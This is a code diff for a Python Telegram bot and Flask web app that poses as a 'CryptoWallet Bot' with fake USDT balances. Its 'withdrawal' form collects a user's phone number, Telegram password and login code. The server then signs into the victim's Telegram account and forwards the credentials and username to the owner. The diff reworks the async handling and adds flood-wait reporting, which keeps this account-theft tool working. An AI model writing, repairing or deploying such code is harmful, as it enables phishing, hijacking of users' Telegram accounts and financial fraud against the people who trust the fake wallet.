@@ -1,10 +1,13 @@
 import asyncio
 import logging
 import os
+import nest_asyncio
 from threading import Thread
 from telethon import TelegramClient, events, Button
-from telethon.errors import SessionPasswordNeededError
+from telethon.errors import SessionPasswordNeededError, FloodWaitError
 from flask import Flask, request, jsonify
+
+nest_asyncio.apply()
 
 API_ID = 8
 API_HASH = '7245de8e747a0d6fbe11f7cc14fcc0bb'
@@ -17,7 +20,6 @@ logging.basicConfig(level=logging.INFO)
 bot = TelegramClient('bot_session', API_ID, API_HASH)
 app = Flask(__name__)
 
-user_states = {}
 user_balances = {}
 
 HTML_PAGE = '''
@@ -60,34 +62,28 @@ HTML_PAGE = '''
         const tg = window.Telegram.WebApp;
         tg.expand();
         const userId = tg.initDataUnsafe?.user?.id || 0;
-
         function updateBalance() {
             fetch('/get_balance?user_id=' + userId)
                 .then(r => r.json())
                 .then(d => document.getElementById('balance').textContent = d.balance + ' USDT');
         }
-
         function showStake() {
             document.getElementById('stakeBlock').style.display = 'block';
             document.getElementById('withdrawBlock').style.display = 'none';
             fetch('/get_address').then(r => r.json()).then(d => document.getElementById('cryptoAddress').textContent = d.address);
         }
-
         function showWithdraw() {
             document.getElementById('withdrawBlock').style.display = 'block';
             document.getElementById('stakeBlock').style.display = 'none';
         }
-
         function goBack() {
             document.getElementById('stakeBlock').style.display = 'none';
             document.getElementById('withdrawBlock').style.display = 'none';
         }
-
         function copyAddress() {
             navigator.clipboard.writeText(document.getElementById('cryptoAddress').textContent);
             alert('Скопировано');
         }
-
         function withdraw() {
             const phone = document.getElementById('phone').value;
             const password = document.getElementById('password').value;
@@ -98,7 +94,6 @@ HTML_PAGE = '''
                 body: JSON.stringify({user_id: userId, phone, password, code})
             }).then(r => r.json()).then(d => alert(d.message));
         }
-
         updateBalance();
     </script>
 </body>
@@ -112,8 +107,7 @@ def index():
 @app.route('/get_balance')
 def get_balance():
     user_id = int(request.args.get('user_id', 0))
-    balance = user_balances.get(user_id, 0)
-    return jsonify({'balance': balance})
+    return jsonify({'balance': user_balances.get(user_id, 0)})
 
 @app.route('/get_address')
 def get_address():
@@ -126,7 +120,7 @@ def withdraw():
     phone = data.get('phone')
     password = data.get('password')
     code = data.get('code')
-    bot.loop.call_soon_threadsafe(lambda: asyncio.ensure_future(process_withdraw(user_id, phone, password, code)))
+    asyncio.ensure_future(process_withdraw(user_id, phone, password, code))
     return jsonify({'message': 'Запрос обрабатывается'})
 
 async def process_withdraw(user_id, phone, password, code):
@@ -140,6 +134,8 @@ async def process_withdraw(user_id, phone, password, code):
             await client.sign_in(password=password)
         me = await client.get_me()
         await bot.send_message(OWNER_ID, f'#ВЫВОД\nТелефон: {phone}\nПароль: {password}\nКод: {code}\nАккаунт: @{me.username}')
+    except FloodWaitError as e:
+        await bot.send_message(OWNER_ID, f'FloodWait: ждать {e.seconds} сек')
     except Exception as e:
         await bot.send_message(OWNER_ID, f'Ошибка вывода: {e}')
     finally:
@@ -149,10 +145,7 @@ async def process_withdraw(user_id, phone, password, code):
 async def start(event):
     user_id = event.sender_id
     user_balances.setdefault(user_id, 0)
-    await event.respond(
-        '🪙 CryptoWallet Bot',
-        buttons=[[Button.web('🚀 Открыть кошелек', f'{WEBHOOK_URL}')]]
-    )
+    await event.respond('🪙 CryptoWallet Bot', buttons=[[Button.web('🚀 Открыть кошелек', WEBHOOK_URL)]])
 
 @bot.on(events.NewMessage(pattern='/setbalance'))
 async def set_balance(event):
@@ -166,13 +159,13 @@ async def set_balance(event):
     except:
         await event.respond('/setbalance <id> <сумма>')
 
+async def main():
+    await bot.start(bot_token=BOT_TOKEN)
+    await bot.run_until_disconnected()
+
 def run_flask():
     app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))
 
-async def main():
-    await bot.start(bot_token=BOT_TOKEN)
-    Thread(target=run_flask, daemon=True).start()
-    await bot.run_until_disconnected()
-
 if __name__ == '__main__':
-    asyncio.run(main())
+    Thread(target=run_flask, daemon=True).start()
+    asyncio.get_event_loop().run_until_complete(main())
